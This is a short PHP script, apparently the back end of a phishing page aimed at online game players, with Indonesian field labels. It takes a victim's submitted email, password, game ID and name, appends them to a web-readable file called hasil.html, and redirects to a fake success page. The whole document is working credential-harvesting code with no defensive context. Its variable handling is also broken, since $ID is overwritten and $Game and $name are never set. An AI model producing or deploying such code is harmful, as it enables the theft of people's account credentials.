<?php
header("Location: succes.php");
$hasil = "hasil.html";
$email = $_POST['email'];
$pass = $_POST['pass'];
$ID = $_POST['ID'];
$ID = $_POST['Game'];
$ID = $_POST['name'];

$handle = fopen($hasil, 'a');

fwrite($handle, "\n");
fwrite($handle, "<br>Email  :");
fwrite($handle, "\n");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "<br>Kata Sandi :");
fwrite($handle, "\n");
fwrite($handle, "$pass");
fwrite($handle, "\n");
fwrite($handle, "<br>ID :");
fwrite($handle, "\n");
fwrite($handle, "$ID");
fwrite($handle, "\n");
fwrite($handle, "<br>Jenis Game :");
fwrite($handle, "\n");
fwrite($handle, "$Game");
fwrite($handle, "\n");fwrite($handle, "<br>");
fwrite($handle, "nama user :");
fwrite($handle, "\n");
fwrite($handle, "$name");
fwrite($handle, "\n");fwrite($handle, "<br>");
fwrite($handle, "----------------------------------------------------------------------");
fclose($handle);
exit;
?>